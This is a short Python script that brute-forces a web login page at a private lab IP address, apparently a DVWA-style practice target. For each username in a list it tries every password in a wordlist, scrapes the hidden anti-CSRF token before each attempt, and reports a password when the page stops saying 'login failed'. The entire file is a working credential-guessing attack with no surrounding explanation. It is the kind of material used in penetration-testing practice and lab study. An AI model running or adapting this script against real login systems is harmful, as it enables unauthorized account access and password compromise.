import requests
from bs4 import BeautifulSoup

userlist = open("userlist.txt").read().splitlines()
wordlist = open("wordlist.txt", "r").read().splitlines()
s = requests.Session()
URL = "http://192.168.183.139:42001/login.php"

for USER in userlist:
    print(f"Bruteforce {USER}")
    for PASS in wordlist:
        r = s.get(URL)
        token = BeautifulSoup(r.text, "html.parser").find("input", attrs={"type": "hidden"}).get("value")
        payload = {"username": USER, "password": PASS, "Login": "Login", "user_token": token}
        r = s.post(URL, data=payload, headers={"Referer": URL})
        msg_tag = BeautifulSoup(r.text, "html.parser").find("div", class_="message")
        msg = msg_tag.get_text(strip=True) if msg_tag else ""
        if "login failed" not in msg.lower():
            print(f"Found Pass: {PASS}")
            break
    else:
        print("Password not found")
